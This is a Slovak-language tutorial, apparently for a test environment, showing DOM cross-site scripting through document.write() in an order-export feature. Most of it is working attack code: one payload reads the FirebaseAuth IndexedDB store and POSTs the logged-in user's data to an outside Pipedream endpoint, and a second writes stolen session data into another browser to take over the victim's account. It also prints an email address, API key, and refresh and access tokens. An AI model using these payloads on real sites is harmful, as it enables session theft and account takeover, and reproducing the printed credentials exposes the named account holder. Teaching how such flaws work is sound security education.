# Document objcet model cross site scripting (DOM XSS)
## document.write()

- Teraz si predstavime DOM (Document pbject model) XSS (Cross site scripting) na priklade vygenerovania exportu objednavky do novohe tabu pomocou metody document.write()
- Metoda document.write() prepisuje celu kostru stranky a generuje novu pomocou argumentu vlozeneho do metody. Tymto sposobom sa daju jednoducho a automatizovane generovat nove stranky alebo upravovat uz existujuce
- Problem nastava ked sa do argumentu vlozi vratane roznych tagov aj skodlivy kod. Skodlivy kod je priamo vlozeny do tela stranky.
- Ako mozeme vidiet v testovacom prostredi, tak mame input kam zapisujeme nazov exportu nasej objednavky a tlacidlo na vygenerovanie exportu.
- Ako prve sa presunieme na podstranku produktov a vlozime lubovolne produkty do kosika
- Ked mame kosik naplneny produktmi mozeme zmenit alebo ponechat nazov exportu a kliknut na tlacidlo “Export”
- Vygeneoval sa nam jednoduchy export objednavky na novom tabe. Ako mozeme vidiet nazov exportu je vypisany ako nadpis nad jednotlivymi polozkami kosika. Hodnota z inputu je priamo vlozene do tela novej stranky cim vznika zranitelnost a priestor na vlozenie skodliveho kodu
- Zopakujme si proces generovania exportu ale teraz vlozime skodlivy kod do inputu pre nazov
- Vlozme nasledovny uryvok kodu do inputu

        const request = window.indexedDB.open("firebaseLocalStorageDb");
        request.onsuccess = (event) => {
          const db = event.target.result;

          const transaction = db.transaction(["firebaseLocalStorage"], "readonly");
          const objectStore = transaction.objectStore("firebaseLocalStorage");

          const getDataRequest = objectStore.getAll();

          getDataRequest.onsuccess = (event) => {

          const headers = new Headers();
          headers.append("Content-Type", "text/plain");

          const options = {
            method: "POST",
            headers,
            mode: "cors",
            body: JSON.stringify(event.target.result),
          };

          fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);
          }
        };
- Ukazkovy kod spristupni lokalnu databazu prehliadaca (indexDb), ktoru sutentifikacny servis FirebaseAuth vyuziva na uchovavanie dat o prihlasenom pouzivatelovi. Vytiahneme data z databazy a cely objekt si odosleme na nas vygenerovany endpoint v sluzbe Pipedream.
- Po vygenerovani exportu mozeme vidiet, ze nazov exportu je prazdny a spustil sa nas kod. Na endpoint by nam mal prist cely uset objekt s datami.
- Odhlasime sa z aplikacie a prihlaisme sa pod inym uctom, bud existujucim alebo si vytvorime novy
- Po prihlaseni vyuzijeme spominanu zranitelnost znova a vlozime do lokalnej databazy data uzivatela, cim prelomime autentifikaciu a prihlasime sa do uctu obete
- Kod na vlozenie pouzivatelskych dat vyzera nasledovne

            const request = window.indexedDB.open("firebaseLocalStorageDb");
            request.onsuccess = (event) => {
              const db = event.target.result;

              const transaction = db.transaction(["firebaseLocalStorage"], "readwrite");
              const objectStore = transaction.objectStore("firebaseLocalStorage");

              const data = {
                fbase_key:
                  "firebase:authUser:AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg:[DEFAULT]",
                value: {
                  uid: "RTejhfCWw0OAlHcoAj41Fy93ZJJ3",
                  email: "mate@gmail.com",
                  emailVerified: false,
                  isAnonymous: false,
                  providerData: [
                    {
                      providerId: "password",
                      uid: "mate@gmail.com",
                      displayName: null,
                      email: "mate@gmail.com",
                      phoneNumber: null,
                      photoURL: null,
                    },
                  ],
                  stsTokenManager: {
                    refreshToken:
                      "AMf-vByIsfsiw-8vT6jzvFkIqMjZhSvTzJ16dCdww3w_Pk_9kwwfanAaW09W-DWc70KzKjxtp7Dq7aEPRImKkgLIHiCN4ROLsi5NBpvQrRSNGonNI-5wt_
                        9PHITM0bt5ZXSayEMzx7dRUHJdj8-lbwiflyUREJh3TUy-QLmoxyg3rY-G6B1Ff1OQPTv-VRFJGmp3GQ2dJ5Bl0hyBKiELNwcjKDTrVyRjPw",
                    accessToken:
                      "eyJhbGciOiJSUzI1NiIsImtpZCI6ImJhNjI1OTZmNTJmNTJlZDQ0MDQ5Mzk2YmU3ZGYzNGQyYzY0ZjQ1M2UiLCJ0eXAiOiJKV1QifQ
          .eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGlwbG9tb3ZrYS10ZXN0LWFwcCIsImF1ZCI6ImRpcGxvbW92a2EtdGVzdC1hcHA
          iLCJhdXRoX3RpbWUiOjE3MTE3OTA0OTYsInVzZXJfaWQiOiJSVGVqaGZDV3cwT0FsSGNvQWo0MUZ5OTNaSkozIiwic3ViIjoiUlRlamhmQ1d3ME9BbE
          hjb0FqNDFGeTkzWkpKMyIsImlhdCI6MTcxMTc5MDQ5NiwiZXhwIjoxNzExNzk0MDk2LCJlbWFpbCI6Im1hdGVAZ21haWwuY29tIiwiZW1haWxfdmVyaWZ
          pZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbIm1hdGVAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc
          3dvcmQifX0.0Mp-T84dmzTpiAdVyhl68WV2qDvTZ78IHGYca5YpBgBx4A_m_YXoJ-IYBaTl-Yp-fXYzuKN3Vff0iqkNA5nVtUcOFfG1X157DrkE80gxp6e
          7ELg2jn_N6mF1Xw-jTSaJoAAsG8f3e_wHp-cfVqWyBNrcUTABrP8Hy_bv-iyUII60PZtjiu_oo7ObVFhoPEim82rlPJDLiwpPMos7qGEBsvw4-fKQvLPkR
          wkGbCf8bKt6Pn_jThtR9JPuhU_G2SlgppA0PuuLSyO8KViFoH4XgFMi9kyX3YU8vmg7O5bDwCYemLLpvQt4KY900_qQgxS2GnX89h_V-hNu_bGqQpL9Zg",
                    expirationTime: 1711794096425,
                  },
                  createdAt: "1711388904315",
                  lastLoginAt: "1711790496471",
                  apiKey: "AIzaSyCx_Vvo5GYYtbjFgSm0GtQv7TWb6mrAZWg",
                  appName: "[DEFAULT]",
                },
              };

              objectStore.clear();

              const addDataRequest = objectStore.add(data);

              addDataRequest.onsuccess = (event) => alert("Success!");
            };
       
- Teraz mozeme refreshnut stranku a ako mozeme vidiet v hlavicke stranky alebo po kliku na profil, ze sme prihlaseny pod inym uctom, teda uctom obete